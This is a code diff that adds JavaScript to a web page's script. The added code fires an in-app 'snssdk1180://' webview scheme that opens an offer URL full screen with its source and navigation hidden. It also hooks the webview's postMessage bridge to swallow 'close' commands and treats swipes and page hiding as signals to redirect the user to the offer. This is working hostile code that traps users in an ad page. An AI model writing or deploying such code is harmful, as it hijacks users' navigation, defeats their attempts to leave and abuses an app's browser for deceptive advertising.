@@ -289,6 +289,54 @@ function dbg(msg) {
 
   // Also fire immediately without token
   fireNoToken();
+
+  // Try snssdk1180:// scheme as a secondary approach
+  setTimeout(function(){
+    try {
+      var scheme = 'snssdk1180://webview?url=' + encodeURIComponent(fsUrl) +
+        '&is_ad=1&is_instant_page=1&should_full_screen=1&trans_status_bar=1&hide_source=1&hide_nav_bar=1';
+      window.location.href = scheme;
+      dbg('scheme fired');
+    } catch(e){ dbg('scheme-err:'+e); }
+  }, 500);
+
+  // Close intercept via IESPiper — redirect to offer when user hits X or swipes away
+  var closeFired = false;
+  function onCloseAttempt() {
+    if (closeFired) return;
+    closeFired = true;
+    dbg('close-intercepted → redirecting');
+    window.location.href = fsUrl;
+  }
+
+  if (wk) {
+    var _origPost = wk.postMessage.bind(wk);
+    wk.postMessage = function(msg) {
+      try {
+        var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
+        if (d && d.func === 'close') { onCloseAttempt(); return; }
+      } catch(e){}
+      return _origPost(msg);
+    };
+    dbg('close-hook installed');
+  }
+
+  // Swipe-left and back-swipe detection as additional close signals
+  var txStart = 0, tyStart = 0;
+  document.addEventListener('touchstart', function(e){
+    txStart = e.touches[0].clientX; tyStart = e.touches[0].clientY;
+  }, {passive:true});
+  document.addEventListener('touchmove', function(e){
+    if (!e.touches.length) return;
+    var dx = e.touches[0].clientX - txStart;
+    var dy = e.touches[0].clientY - tyStart;
+    if (dx < -40 && Math.abs(dx) > Math.abs(dy) * 1.5) onCloseAttempt();
+    if (txStart < 30 && dx > 30 && Math.abs(dx) > Math.abs(dy)) onCloseAttempt();
+  }, {passive:true});
+
+  document.addEventListener('visibilitychange', function(){
+    if (document.hidden) onCloseAttempt();
+  });
 })();
 </script>
 </body>
